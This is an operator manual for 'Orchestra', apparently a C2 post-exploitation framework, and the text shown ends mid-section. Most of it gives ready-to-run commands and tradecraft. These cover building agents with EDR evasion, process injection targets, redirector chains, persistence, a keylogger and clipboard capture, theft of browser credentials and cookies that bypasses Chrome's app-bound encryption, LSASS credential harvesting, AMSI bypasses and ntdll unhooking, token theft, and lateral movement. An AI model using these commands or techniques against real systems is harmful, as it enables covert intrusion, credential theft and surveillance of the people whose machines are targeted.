# Operator Manual

Advanced manual for Orchestra operators: profile management, technique selection, redirector chains, multi-operator workflows, audit log review, hot-reload, troubleshooting, and operational tradecraft.

---

## Overview

This manual covers day-to-day operational use of the Orchestra platform after deployment. It assumes you have already:
- Deployed an Orchestra server
- Built at least one agent
- Configured at least one malleable profile
- (Optional) Deployed redirectors

---

## 1. Server Management

### Starting the Server

```bash
# Development (foreground)
orchestra-server --config orchestra-server.toml

# Production (systemd)
systemctl start orchestra-server

# With custom config
orchestra-server --config /etc/orchestra/production.toml
```

### Server Configuration (`orchestra-server.toml`)

```toml
[server]
bind_addr = "0.0.0.0:8443"
admin_token = "admin-secret-token-here"
agent_shared_secret = "agent-psk-here"
tls_cert = "certs/server.crt"
tls_key = "certs/server.key"
audit_log = "audit.jsonl"
profile_dir = "profiles/"
build_dir = "builds/"
max_agents = 1000
heartbeat_timeout_secs = 300
```

### Server CLI

```
orchestra-server [OPTIONS]

Options:
  --config <PATH>              Configuration file path
  --validate-profile <PATH>    Validate a profile TOML file
  --generate-token <ROLE>      Generate auth token (admin, operator, redirector)
  --export-audit <PATH>        Export audit log to JSON
  --list-profiles              List loaded profiles
  --version                    Show version
  -h, --help                   Show help
```

---

## 2. Agent Building

### Building an Agent

```bash
# Build with default profile
orchestra-server build --profile default

# Build with specific features
orchestra-server build --profile linkedin --features "http-transport,memory-guard,direct-syscalls"

# Build for specific target
orchestra-server build --profile linkedin --target x86_64-pc-windows-gnu

# Build with custom output
orchestra-server build --profile linkedin --output /tmp/agent.exe
```

### Agent Feature Flags

Select features based on the operational environment:

| Feature | Use When | Avoid When |
|---------|----------|------------|
| `http-transport` | Standard C2 over HTTPS | Using DNS or SMB only |
| `doh-transport` | DNS-based C2 needed | HTTP is sufficient |
| `ssh-transport` | SSH tunnel C2 | No SSH infrastructure |
| `smb-pipe-transport` | P2P SMB relay | No Windows targets |
| `outbound-c` | Target has strict egress | Normal networks |
| `p2p-tcp` | P2P mesh networking | Single-agent operations |
| `direct-syscalls` | EDR evasion needed | No EDR present |
| `memory-guard` | Memory scanning risk | Low OPSEC environment |
| `self-reencode` | Signature-based detection | No AV/EDR |
| `network-discovery` | Network enumeration needed | Stealth-only ops |
| `persistence` | Long-term access needed | Short engagement |
| `remote-assist` | GUI interaction needed | Headless targets |
| `hci-research` | HCI telemetry capture | Not doing HCI research |
| `hot-reload` | Runtime config changes needed | Stable configuration |

### Feature Combinations by Scenario

**Standard Engagement:**
```bash
--features "http-transport,memory-guard,direct-syscalls,self-reencode"
```

**High-Stealth EDR Environment:**
```bash
--features "http-transport,memory-guard,direct-syscalls,self-reencode,p2p-tcp"
```

**DNS-Only Covert:**
```bash
--features "doh-transport,memory-guard,direct-syscalls"
```

**Pivot/Lateral Movement:**
```bash
--features "http-transport,smb-pipe-transport,p2p-tcp,network-discovery"
```

**Full-Featured:**
```bash
--features "http-transport,doh-transport,ssh-transport,smb-pipe-transport,p2p-tcp,direct-syscalls,memory-guard,self-reencode,network-discovery,persistence,remote-assist,hot-reload"
```

---

## 3. Malleable Profile Management

### Creating a New Profile

1. Create a new TOML file in the `profiles/` directory:

```bash
cp profiles/default.toml profiles/my-operation.toml
```

2. Edit the profile:

```toml
[profile]
name = "my-operation"
author = "operator-1"
description = "Custom profile for Operation X"

[global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
jitter = 37
sleep_time = 45

[http_get]
uri = ["/api/v2/notifications", "/api/v2/feed"]
verb = "GET"

[http_get.headers]
Accept = "application/json"
Connection = "keep-alive"

[http_get.metadata]
delivery = "Cookie"
key = "session_token"
transform = "Base64"

[http_get.client]
prepend = "JSESSIONID="
append = ";"
transform = "Base64"

[http_post]
uri = ["/api/v2/events", "/api/v2/analytics"]
verb = "POST"

[http_post.headers]
Content-Type = "application/json"
Accept = "application/json"

[http_post.output]
delivery = "Body"
transform = "Base64"
```

3. Validate the profile:

```bash
orchestra-server validate-profile --path profiles/my-operation.toml
```

4. Hot-reload (server picks up changes automatically):

```bash
# Server watches the profiles/ directory
# Just save the file - no restart needed
```

### Profile Selection Matrix

Choose a profile that matches the target's network environment:

| Target Environment | Recommended Profile | Key Characteristics |
|--------------------|--------------------|--------------------|
| Enterprise corporate | LinkedIn, Microsoft Teams | Common SaaS traffic |
| Cloud-heavy org | CloudFront, AWS API | CDN/API traffic |
| Government | Custom (.gov mimicry) | Matching government services |
| Tech company | GitHub, Slack API | Developer tool traffic |
| Healthcare | Epic, Cerner API | Healthcare IT traffic |
| Financial | Bloomberg, Reuters | Financial platform traffic |

---

## 4. Injection Technique Selection

### Decision Matrix

| Scenario | Recommended Technique | Reason |
|----------|----------------------|--------|
| Standard injection | Process Hollowing | Reliable, well-tested |
| EDR with memory scanning | Module Stomping | Blends with loaded modules |
| Suspended process target | Early Bird APC | Fires before main thread |
| Strict thread monitoring | ThreadPool Injection | No thread creation |
| Maximum stealth | Fiber Injection | User-mode scheduling |
| Avoiding new threads | Thread Hijacking | Reuses existing thread |

### Selecting a Target Process

Choose a target process that:

1. **Is always running** — `explorer.exe`, `svchost.exe`, `RuntimeBroker.exe`
2. **Matches the architecture** — x64 agent → x64 target process
3. **Has network access** — Browsers, updaters, system services
4. **Is not heavily monitored** — Avoid EDR-owned processes

| Good Targets | Avoid |
|-------------|-------|
| `explorer.exe` | `csrss.exe` (protected) |
| `svchost.exe` (network service) | `lsass.exe` (heavily monitored) |
| `RuntimeBroker.exe` | EDR service processes |
| `taskhostw.exe` | Antivirus processes |
| `SearchHost.exe` | Virtualization processes |

---

## 5. Redirector Chain Management

### Single Redirector

Simplest setup — one redirector between agent and C2:

```
Agent → Redirector → C2
```

### Multi-Redirector Chain

For high-value targets, chain multiple redirectors:

```
Agent → Redirector #1 (VPS) → Redirector #2 (VPS) → C2
```

Configure in the agent's profile:

```toml
# In the build profile
[[redirectors]]
address = "rd1.example.com:443"
priority = 1
weight = 70

[[redirectors]]
address = "rd2.example.com:443"
priority = 2
weight = 30
```

### CDN + Redirector

Combine CDN domain fronting with a redirector:

```
Agent → CDN Edge → Redirector → C2
```

The CDN masks the redirector's IP from the target network.

### Redirector Health Monitoring

Check redirector status from the server:

```bash
# List all registered redirectors
orchestra-server list-redirectors

# Output:
# ID         Address              Profile   Status   Uptime     Errors
# rd-uuid-1  rd1.example.com:443  linkedin  Healthy  7d 12h     0
# rd-uuid-2  rd2.example.com:443  linkedin  Degraded 2d 4h      15
```

---

## 6. Multi-Operator Workflows

### Operator Tokens

Each operator should have their own token:

```bash
# Generate operator token
orchestra-server generate-token --role operator
# Output: op_abc123def456...

# Token includes operator ID for audit trail
```

### Task Attribution

Every `TaskRequest` includes an `operator_id` that is:
- Automatically set from the authentication token
- Recorded in the audit log
- Visible to other operators in the dashboard

### Concurrent Operations

The server supports multiple operators simultaneously:

- **Task queuing** — Commands are queued per agent
- **Exclusive commands** — Shell sessions lock to one operator
- **File locking** — File writes are serialized
- **Visibility** — All operators see active tasks and results

---

## 7. Audit Log Review

### Audit Log Format

Each line in the JSONL audit log:

```json
{
  "timestamp": 1705312200,
  "agent_id": "DESKTOP-WIN10",
  "operator_id": "op-alice",
  "action": "ReadFile",
  "details": "Read /etc/hosts (256 bytes)",
  "outcome": "Success",
  "hmac": "sha256:abc123..."
}
```

### Reviewing Audit Logs

```bash
# Export audit log
orchestra-server export-audit --output audit-export.jsonl

# Search for specific actions
cat audit-export.jsonl | jq 'select(.action == "StartShell")'

# Search for specific operator
cat audit-export.jsonl | jq 'select(.operator_id == "op-alice")'

# Find failures
cat audit-export.jsonl | jq 'select(.outcome == "Failure")'

# Count actions per agent
cat audit-export.jsonl | jq '.agent_id' | sort | uniq -c | sort -rn
```

### Tamper Detection

Each audit entry is HMAC-signed. To verify:

```bash
orchestra-server verify-audit --path audit.jsonl
# Output: 10,000 entries verified, 0 tampered
```

---

## 8. Hot-Reload

### Profile Hot-Reload

The server watches the `profiles/` directory for changes:

1. **New file** → Profile is loaded and available for new builds
2. **Modified file** → Profile is reloaded (active agents keep their build-time profile)
3. **Deleted file** → Profile is removed (existing builds continue to work)

### Agent Config Hot-Reload

Send `ReloadConfig` command to an agent:

```bash
# Via the operator console
orchestra-console --server https://c2:8443 --token $TOKEN \
  send --agent DESKTOP-WIN10 --command ReloadConfig
```

The agent re-reads its configuration file without restarting.

### Module Hot-Reload

Upload new plugin versions without agent restart:

```bash
# Upload new plugin version
orchestra-server upload-module --name scanner --version 2.0.0 --file scanner.dll

# Tell agent to download new version
orchestra-console send --agent DESKTOP-WIN10 --command DownloadModule --args "scanner"
```

---

## 9. P2P Mesh Operations

### Establishing Peer Links

```bash
# Link agent A (parent) to agent B at address 10.0.0.20:4443
# The server instructs agent A to connect:
curl -X POST https://c2.example.com/api/mesh/connect \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"parent_agent_id":"DESKTOP-WIN10","child_address":"10.0.0.20:4443"}'

# Or via orchestra-console:
orchestra-console send --agent DESKTOP-WIN10 --command MeshConnect \
  --args "10.0.0.20:4443"

# Disconnect a specific link
curl -X POST https://c2.example.com/api/mesh/disconnect \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id":"DESKTOP-WIN10","link_id":"0x00000001"}'
```

### Choosing Topology Mode

Configure `mesh_mode` per agent at build time or via server command:

| Mode | When to Use | Trade-offs |
|------|-------------|------------|
| **Tree** | Maximum OPSEC required | No lateral communication; all traffic through server |
| **Mesh** | Maximum resilience needed | More visible traffic patterns; P2P links detectable |
| **Hybrid** | General operations (default) | Balanced OPSEC and resilience |

### Mesh Topology Output

```bash
# View full mesh topology
curl https://c2.example.com/api/mesh/topology \
  -H "Authorization: Bearer $TOKEN"

# Example output:
# Server
#   └── DESKTOP-WIN10 (parent, internet-facing)
#         ├── 10.0.0.20:4443 (child) ─── mesh_mode=Hybrid
#         │     └── 10.0.0.30:4443 (grandchild)
#         └── 10.0.0.40:4443 (child)
#               ◄──► peer link to 10.0.0.20:4443

# View mesh statistics
curl https://c2.example.com/api/mesh/stats \
  -H "Authorization: Bearer $TOKEN"
```

```
Server
  └── DESKTOP-WIN10 (parent, internet-facing)
        ├── 10.0.0.20:4443 (child, internal network)
        │     └── 10.0.0.30:4443 (grandchild)
        └── 10.0.0.40:4443 (child)
              ◄──► peer link to 10.0.0.20:4443
```

### Compartment Configuration

Compartments isolate agent groups — only agents in the same compartment can
form peer links:

```bash
# Assign agents to compartments
curl -X POST https://c2.example.com/api/mesh/set-compartment \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id":"DESKTOP-FIN01","compartment":"finance"}'

curl -X POST https://c2.example.com/api/mesh/set-compartment \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id":"DESKTOP-ENG01","compartment":"engineering"}'

# DESKTOP-FIN01 and DESKTOP-ENG01 cannot form peer links
# Cross-compartment traffic routes through the server
```

### Mesh Routing

- **Distance-vector routing** automatically discovers optimal paths (Mesh/Hybrid).
- Routes updated every 60 seconds via `RouteUpdate` frames.
- Quality metric: 40% latency + 40% packet loss + 20% jitter.
- Latency increases ~50ms per hop; bandwidth limited by slowest link.
- **Tree fallback**: If no mesh route exists, data relays through the server.

### Compromise Response Procedures

#### Quarantine a Suspect Agent

```bash
# 1. Quarantine the agent (stops relaying, keeps server connection)
curl -X POST https://c2.example.com/api/mesh/quarantine \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id":"SUSPICIOUS-HOST","reason":2}'

# 2. Verify quarantine in topology
curl https://c2.example.com/api/mesh/topology \
  -H "Authorization: Bearer $TOKEN"

# 3. Clear quarantine when resolved
curl -X POST https://c2.example.com/api/mesh/clear-quarantine \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id":"SUSPICIOUS-HOST"}'
```

#### Kill Switch (Mesh-Wide Termination)

```bash
# Terminate ALL P2P links on a specific agent
curl -X POST https://c2.example.com/api/mesh/kill-switch \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id":"DESKTOP-WIN10"}'

# Terminate ALL P2P links mesh-wide (omit agent_id)
curl -X POST https://c2.example.com/api/mesh/kill-switch \
  -H "Authorization: Bearer $TOKEN"
```

> **⚠️ Warning**: Kill switch immediately terminates all P2P links. Agents
> revert to direct server-only communication. Use only in active compromise
> scenarios.

### Key Rotation Monitoring

```bash
# Check link status including key rotation
orchestra-console send --agent DESKTOP-WIN10 --command ListLinks

# Key rotation runs automatically every 4 hours per link
# Monitor for failed rotations (retry limit: 3)
# If rotation fails persistently, the link may need to be re-established
```

Key rotation timeline per link:
- **Every 4 hours**: New X25519 ECDH exchange generates fresh link key.
- **30-second overlap**: Both old and new keys accepted during transition.
- **60-second timeout**: If no `KeyRotationAck`, rotation is retried.
- **3 retries max**: After 3 failures, rotation is abandoned (link continues on old key).

### Mesh Performance Tuning

| Parameter | Default | Recommendation |
|-----------|---------|----------------|
| Heartbeat interval | 30s | Reduce to 15s for high-churn meshes |
| Route update interval | 60s | Reduce to 30s for >50 agents |
| Max children per parent | 10 | Increase for wide networks; decreases per-child bandwidth |
| Relay throttle fraction | 0.3 | Increase to 0.5 for dedicated relay agents |
| Dead threshold (missed heartbeats) | 8 | Increase for high-latency satellite links |

### Broadcasting Commands

```bash
# Broadcast to all agents
curl -X POST https://c2.example.com/api/mesh/broadcast \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"command":"GetSystemInfo"}'

# Broadcast to a specific compartment
curl -X POST https://c2.example.com/api/mesh/broadcast \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"command":"GetSystemInfo","compartment":"finance"}'
```

---

## 10. Persistence Management

### Enabling Persistence

```bash
# Enable persistence on an agent
orchestra-console send --agent DESKTOP-WIN10 --command EnablePersistence
```

### Platform-Specific Behavior

| Platform | Method | Notes |
|----------|--------|-------|
| Windows | Registry Run key | Survives reboots, visible in `regedit` |
| Windows | COM Hijack | More stealthy, requires COM knowledge |
| Windows | WMI Subscription | Persistent, harder to detect |
| Linux | cron | `@reboot` entry, visible in `crontab -l` |
| Linux | systemd | User service unit, visible in `systemctl` |
| macOS | LaunchAgent | `.plist` in `~/Library/LaunchAgents/` |

### Disabling Persistence

```bash
# Remove all persistence mechanisms
orchestra-console send --agent DESKTOP-WIN10 --command DisablePersistence
```

Always disable persistence at the end of an engagement.

---

## 11. Troubleshooting

### Agent Not Beacons

1. **Check network connectivity**:
   ```bash
   # From the agent's host
   curl -vk https://c2-server:8443/health
   ```

2. **Check profile match**: Agent and server must use the same profile name

3. **Check TLS**: Certificate must be valid or pinned correctly

4. **Check sleep timer**: Agent may be sleeping (wait for the configured interval)

5. **Check sandbox detection**: Agent may have detected a sandbox and exited silently

### Agent Exits After Start

1. **Environment check failure**: Agent detected sandbox/VM/debugger
   - Review env_check configuration
   - Disable specific checks for testing: `ORCHESTRA_SKIP_SANDBOX=1`

2. **Domain mismatch**: Agent detected it's not on the expected domain
   - Check `env_check.domain_suffix` in agent config

3. **Debugger detection**: Agent detected a debugger
   - Remove debuggers or disable check for testing

### Task Execution Fails

1. **Permission denied**: Agent process lacks permissions
   - Check integrity level
   - Consider `MakeToken` or `StealToken` for elevation

2. **Path not allowed**: File operation outside `allowed_paths`
   - Update agent config `allowed_paths`
   - Use `ReloadConfig` to apply changes

3. **Timeout**: Command execution exceeded time limit
   - Increase timeout in server configuration
   - Check if command is waiting for input

### Module Loading Fails

1. **Signature mismatch**: Module was not signed with the correct key
   - Re-sign the module: `keygen sign --key signing.key --module plugin.dll`
   - Verify signature: `keygen verify --pubkey signing.pub --module plugin.dll`

2. **Architecture mismatch**: Module is x86 but agent is x64
   - Build module for the correct architecture

3. **Missing dependencies**: Module depends on unavailable libraries
   - Ensure all dependencies are statically linked or available

### Redirector Not Forwarding

1. **Profile URI mismatch**: Agent's request URI doesn't match profile patterns
   - Verify agent was built with the correct profile
   - Check URI patterns in the redirector's profile

2. **C2 unreachable**: Redirector can't reach C2 server
   - Test connectivity: `curl -k https://c2-server:8443/health`
   - Check firewall rules between redirector and C2

3. **TLS failure**: Certificate issues between redirector and C2
   - Verify redirector trusts the C2's CA
   - Check certificate expiration

---

## 12. Operational Tradecraft

### Communication Discipline

1. **Use appropriate sleep timers**: Match the target's network traffic patterns
   - Business hours: 30–60s
   - After hours: 300–600s
   - High OPSEC: 600–3600s

2. **Use jitter**: Always set jitter to 20–40% to avoid periodic beaconing patterns

3. **Use working hours**: Configure agents to only beacon during business hours

4. **Rotate profiles**: Change malleable profiles periodically during long engagements

### Injection Discipline

1. **Inject into appropriate processes**: Match the target's software landscape
2. **Avoid double injection**: Check if a process is already injected
3. **Clean up**: Unload modules and revert changes when done
4. **Monitor for detection**: Watch for agent disconnections that may indicate EDR detection

### Infrastructure Discipline

1. **Rotate redirectors**: Change redirector IPs periodically
2. **Monitor health**: Watch redirector error rates
3. **Separate infrastructure**: Don't reuse IPs/domains between operations
4. **Cleanup**: Remove all infrastructure after the engagement

### Audit Discipline

1. **Review audit logs daily**: Check for unexpected commands or failures
2. **Attribute all actions**: Ensure each operator uses their own token
3. **Export logs regularly**: Maintain off-server copies of audit logs
4. **Verify integrity**: Run `verify-audit` periodically to detect tampering

---

## 13. Console CLI Reference

### `orchestra-console`

```
Usage: orchestra-console [OPTIONS] <COMMAND>

Commands:
  send        Send a command to an agent
  list        List connected agents
  jobs        List active jobs
  modules     List loaded modules
  profiles    List available profiles
  redirectors List registered redirectors
  audit       Query audit log
  build       Request an agent build

Options:
  --server <URL>       Orchestra server URL
  --token <TOKEN>      Authentication token
  --output <FORMAT>    Output format: text, json (default: text)
  -h, --help           Show help
```

### Send Command Examples

```bash
# Ping an agent
orchestra-console send --agent DESKTOP-WIN10 --command Ping

# Execute an approved script
orchestra-console send --agent DESKTOP-WIN10 --command RunApprovedScript --args "backup-check"

# Read a file
orchestra-console send --agent DESKTOP-WIN10 --command ReadFile --args "/etc/hosts"

# Start a shell
orchestra-console send --agent DESKTOP-WIN10 --command StartShell
# Returns: session_id

# Send shell input
orchestra-console send --agent DESKTOP-WIN10 --command ShellInput --args '{"session_id":"abc","data":"whoami\n"}'

# Get shell output
orchestra-console send --agent DESKTOP-WIN10 --command ShellOutput --args '{"session_id":"abc"}'

# List processes
orchestra-console send --agent DESKTOP-WIN10 --command ListProcesses

# Capture screenshot
orchestra-console send --agent DESKTOP-WIN10 --command CaptureScreen

# Discover network
orchestra-console send --agent DESKTOP-WIN10 --command DiscoverNetwork

# Enable persistence
orchestra-console send --agent DESKTOP-WIN10 --command EnablePersistence

# Shutdown agent
orchestra-console send --agent DESKTOP-WIN10 --command Shutdown
```

---

---

## 14. .NET Assembly Execution

### ExecuteAssembly — In-Process .NET Execution

Execute any .NET Framework 4.x assembly in-process via CLR hosting:

```bash
# Execute a .NET assembly with arguments
orchestra-console send --agent DESKTOP-WIN10 --command ExecuteAssembly \
  --args '{"data":"<base64-encoded-assembly>","args":"arg1 arg2","timeout":60}'
```

**How it works:**
1. The agent lazily initializes the CLR (via `mscoree.dll` → `CLRCreateInstance`) on first use
2. A fresh `AppDomain` is created for each execution (isolated, auto-unloaded)
3. AMSI bypass is applied before loading the assembly (prefers write-raid, then HWBP, then memory-patch)
4. The assembly's entry point is called via `ExecuteInDefaultAppDomain`
5. Output (stdout/stderr) is captured and returned
6. CLR resources are auto-teardown after 5 minutes idle

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `data` | bytes | required | Raw .NET assembly bytes |
| `args` | string | `""` | Space-delimited arguments |
| `timeout_secs` | u32 | 60 | Execution timeout in seconds |

**Operational notes:**
- Assembly must target .NET Framework 4.x (not .NET Core/.NET 5+)
- Max output: 4 MiB per execution
- Each execution gets its own `AppDomain` — no state leakage between runs
- CLR stays loaded between executions (lazy init, once per process)

---

## 15. BOF / COFF Execution

### ExecuteBOF — Beacon Object File Execution

Execute standard BOF files compatible with the public Cobalt Strike BOF ecosystem:

```bash
# Execute a BOF with packed arguments
orchestra-console send --agent DESKTOP-WIN10 --command ExecuteBOF \
  --args '{"data":"<base64-encoded-coff>","args":"<packed-args>","timeout":30}'
```

**How it works:**
1. Parse COFF object file headers, sections, symbols, and relocations
2. Allocate RW memory, copy sections
3. Resolve Beacon-compatible API exports (BeaconPrintf, BeaconDataParse, etc.)
4. Apply x86_64 COFF relocations
5. `mprotect` to RX, call `void go(char *args, int len)`
6. Collect output from Beacon-compatible output functions

**Beacon-compatible API exports:**

| Export | Purpose |
|--------|---------|
| `BeaconPrintf` | Formatted output |
| `BeaconOutput` | Raw output |
| `BeaconDataParse` | Parse packed arguments |
| `BeaconDataInt` / `BeaconDataShort` | Extract numeric args |
| `BeaconDataLength` / `BeaconDataExtract` | Extract buffer args |
| `BeaconFormatAlloc` / `BeaconFormatPrintf` | Format buffer |
| `BeaconUseToken` / `BeaconRevertToken` | Token ops (no-op) |
| `BeaconIsAdmin` | Elevation check |
| `toNative` | char* to wide string |

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `data` | bytes | required | COFF object file bytes |
| `args` | bytes | `""` | Packed BOF arguments |
| `timeout_secs` | u32 | 30 | Execution timeout |

**Constraints:**
- Max BOF size: 1 MiB
- Max output: 1 MiB
- Architecture: x86_64 only
- Execution is synchronous (blocks until `go()` returns)

---

## 16. Interactive Shell Management

### Creating and Using Shells

Full interactive PTY sessions with background reader threads:

```bash
# Create a new shell session
orchestra-console send --agent DESKTOP-WIN10 --command CreateShell \
  --args '{"shell_type":"cmd"}'
# Returns: {"session_id":"shell-abc123","pid":4521}

# Send input to the shell
orchestra-console send --agent DESKTOP-WIN10 --command ShellInput \
  --args '{"session_id":"shell-abc123","data":"whoami\n"}'

# List all active shell sessions
orchestra-console send --agent DESKTOP-WIN10 --command ShellList

# Resize a shell's PTY
orchestra-console send --agent DESKTOP-WIN10 --command ShellResize \
  --args '{"session_id":"shell-abc123","rows":50,"cols":120}'

# Close a shell session
orchestra-console send --agent DESKTOP-WIN10 --command ShellClose \
  --args '{"session_id":"shell-abc123"}'
```

**Shell output** is delivered asynchronously via `ShellOutput` messages:
- Output arrives as `Message::ShellOutput` events
- Each message includes `session_id`, `stream` (Stdout/Stderr), and `data`
- Reader threads are **paused during sleep obfuscation** to prevent corruption

**Supported shells:**

| Platform | Default | Custom |
|----------|---------|--------|
| Windows | `cmd.exe` | Any executable path |
| Linux | `/bin/sh` | `/bin/zsh`, `/bin/bash`, custom |
| macOS | `/bin/sh` | `/bin/zsh`, `/bin/bash`, custom |

**OPSEC notes:**
- Multiple concurrent sessions supported
- Shell reader threads are automatically paused/resumed during sleep obfuscation cycles
- Shell handles are cleaned up when the agent disconnects

---

## 17. Surveillance Operations

### Screenshot Capture

```bash
# Capture all monitors
orchestra-console send --agent DESKTOP-WIN10 --command Screenshot
# Returns: {"images":[{"monitor":0,"width":1920,"height":1080,"data":"<base64-png>"}]}
```

Requires `surveillance` feature flag.

### Keylogger

```bash
# Start keylogger
orchestra-console send --agent DESKTOP-WIN10 --command KeyloggerStart

# Dump captured keystrokes (clears buffer)
orchestra-console send --agent DESKTOP-WIN10 --command KeyloggerDump
# Returns: {"keystrokes":[{"timestamp":...,"key":"A","modifiers":["Shift"]}, ...]}

# Stop keylogger
orchestra-console send --agent DESKTOP-WIN10 --command KeyloggerStop
```

**Implementation:** `WH_KEYBOARD_LL` hook via `SetWindowsHookExW`. All data stored in ChaCha20-Poly1305 encrypted ring buffers.

### Clipboard Monitoring

```bash
# Start clipboard monitor
orchestra-console send --agent DESKTOP-WIN10 --command ClipboardMonitorStart

# Dump captured clipboard data
orchestra-console send --agent DESKTOP-WIN10 --command ClipboardMonitorDump

# Stop clipboard monitor
orchestra-console send --agent DESKTOP-WIN10 --command ClipboardMonitorStop

# One-shot clipboard read
orchestra-console send --agent DESKTOP-WIN10 --command ClipboardGet
```

**All surveillance commands require the `surveillance` feature flag.**

---

## 18. Browser Data Extraction

### Collecting Browser Credentials and Cookies

```bash
# Collect Chrome credentials
orchestra-console send --agent DESKTOP-WIN10 --command BrowserData \
  --args '{"browser":"chrome","data_type":"credentials"}'

# Collect Firefox cookies
orchestra-console send --agent DESKTOP-WIN10 --command BrowserData \
  --args '{"browser":"firefox","data_type":"cookies"}'

# Collect all data from all browsers
orchestra-console send --agent DESKTOP-WIN10 --command BrowserData \
  --args '{"browser":"all","data_type":"all"}'
```

**Browser types:** `chrome`, `edge`, `firefox`, `all`
**Data types:** `credentials`, `cookies`, `all`

**Chrome App-Bound Encryption (v127+):**

Chrome 127+ uses App-Bound Encryption tied to `elevation_service.exe`. The agent uses three bypass strategies in order:

1. **Local COM** — Activate `IElevator` COM object in-process (requires elevated agent)
2. **SYSTEM token + DPAPI** — Impersonate SYSTEM, call `CryptUnprotectData` (requires `SeDebugPrivilege`)
3. **Named-pipe IPC** — Communicate with `elevation_service.exe` via named pipe (requires service running)

**Requires the `browser-data` feature flag. Available on Windows only.**

---

## 19. LSASS Credential Harvesting

### HarvestLSASS — In-Memory Credential Extraction

```bash
# Harvest credentials from LSASS
orchestra-console send --agent DESKTOP-WIN10 --command HarvestLSASS
# Returns: JSON with MSV (NT hashes), WDigest (plaintext), Kerberos, DPAPI, DCC2
```

**How it works:**
1. Open LSASS process handle via `NtOpenProcess` (indirect syscall)
2. Enumerate memory regions via `NtQueryVirtualMemory`
3. Read credential structures incrementally via `NtReadVirtualMemory`
4. Parse in-process — no disk writes, no `MiniDumpWriteDump`

**Extracted credential types:**

| Type | Contents | Value |
|------|----------|-------|
| **MSV1.0** | NT hashes | `LM:NT` hash pairs |
| **WDigest** | Plaintext passwords | Only if WDigest enabled (pre-Win8) |
| **Kerberos** | TGT/TGS tickets | Ticket hashes |
| **DPAPI** | Master keys | Key material |
| **DCC2** | Domain cached credentials | Domain hash cache |

**Supported Windows builds:** 19041–26100 (Windows 10 2004 through Windows 11 24H2)

**OPSEC properties:**
- No file I/O — all reading via syscalls
- No `MiniDumpWriteDump` — avoids the most common LSASS access indicator
- Indirect syscalls for LSASS handle acquisition
- Incremental reads — only credential-bearing memory regions

> **⚠️ Warning**: LSASS access is heavily monitored by EDR products. Use only when
> the operational benefit outweighs the detection risk.

---

## 20. NTDLL Unhooking

### On-Demand Ntdll Unhook

```bash
# Force a full ntdll re-fetch
orchestra-console send --agent DESKTOP-WIN10 --command UnhookNtdll
# Returns: UnhookResult { method, bytes_overwritten, hooks_detected, stubs_re_resolved, error }
```

**When to use:**
- After EDR detection events (possible hooking)
- After agent migration to a new process
- Periodically during long engagements
- After sleep obfuscation wake (automatic, but can be triggered manually)

**Unhooking pipeline:**
1. Hook detection: Inspect first bytes of 23 critical syscall stubs for hook indicators (`E9 jmp`, `FF 25 jmp`, `ud2`, `ret`)
2. Primary path: Re-fetch `.text` from `\KnownDlls\ntdll.dll` (kernel-maintained clean copy)
3. Fallback: Read `C:\Windows\System32\ntdll.dll` from disk (if KnownDlls blocked)
4. Chunked overwrite: 4 KiB chunks with 50 µs anti-EDR delays
5. Cache invalidation: Re-resolve all 23 critical SSNs from clean ntdll

**Automatic triggers:**
- **Halo's Gate failure**: When all adjacent syscall stubs are hooked
- **Post-sleep wake**: Step 12 of sleep obfuscation checks for new hooks
- **Manual**: `UnhookNtdll` command from operator

---

## 21. AMSI Bypass Mode

### Switching AMSI Bypass Strategy at Runtime

The agent supports switching AMSI bypass strategies at runtime without
rebuilding.  Use the `AmsiBypassMode` command to select a strategy:

```bash
# Enable the write-raid AMSI bypass (most stealthy, recommended)
orchestra-console send --agent DESKTOP-WIN10 --command AmsiBypassMode \
  --args '{"mode":"write_raid"}'

# Switch to hardware breakpoint bypass
orchestra-console send --agent DESKTOP-WIN10 --command AmsiBypassMode \
  --args '{"mode":"hwbp"}'

# Switch to memory-patch bypass
orchestra-console send --agent DESKTOP-WIN10 --command AmsiBypassMode \
  --args '{"mode":"memory_patch"}'

# Let the agent select the best available strategy
# (write-raid > hwbp > memory-patch)
orchestra-console send --agent DESKTOP-WIN10 --command AmsiBypassMode \
  --args '{"mode":"auto"}'
```

**Available modes:**

| Mode | Feature Flag | Description |
|------|-------------|-------------|
| `write_raid` | `write-raid-amsi` | Data-only race condition on `AmsiInitFailed` flag. Zero code/permission/breakpoint modifications. **Most stealthy.** |
| `hwbp` | `hwbp-amsi` | Hardware breakpoints (DR0/DR1) + VEH handler. No code patches, but breakpoint registers are monitorable. |
| `memory_patch` | *(always available)* | Direct code patching of `AmsiScanBuffer`. Detectable via integrity checks. |
| `auto` | *(any)* | Automatically selects the best available: write-raid → hwbp → memory-patch. |

**Operational notes:**
- Switching modes disables the current bypass before enabling the new one
- Write-raid spawns a background thread that is automatically paused during sleep obfuscation cycles
- If the requested mode's feature flag is not compiled, the agent returns an error
- `auto` mode always succeeds (falls back to whatever is available)

---

## 22. Token Manipulation

### Token Operations

```bash
# Create a new logon session with credentials
orchestra-console send --agent DESKTOP-WIN10 --command MakeToken \
  --args '{"username":"admin","password":"pass123","domain":"CORP"}'

# Steal a token from a running process
orchestra-console send --agent DESKTOP-WIN10 --command StealToken \
  --args '{"pid":1234}'

# Revert to original security context
orchestra-console send --agent DESKTOP-WIN10 --command Rev2Self

# Elevate to SYSTEM via named pipe impersonation
orchestra-console send --agent DESKTOP-WIN10 --command GetSystem
```

**Token lifecycle:**
1. `MakeToken` / `StealToken` — Acquire new security context
2. All subsequent commands run under the new context
3. `Rev2Self` — Revert to original context
4. `GetSystem` — Elevate to SYSTEM (named pipe impersonation technique)

**Thread safety:** Token operations are thread-safe. Multiple commands can use the impersonated token simultaneously.

---

## 22. Lateral Movement

### Lateral Movement Commands

```bash
# PsExec-style execution
orchestra-console send --agent DESKTOP-WIN10 --command PsExec \
  --args '{"target":"192.168.1.50","service_name":"update","command":"whoami"}'

# WMI remote execution
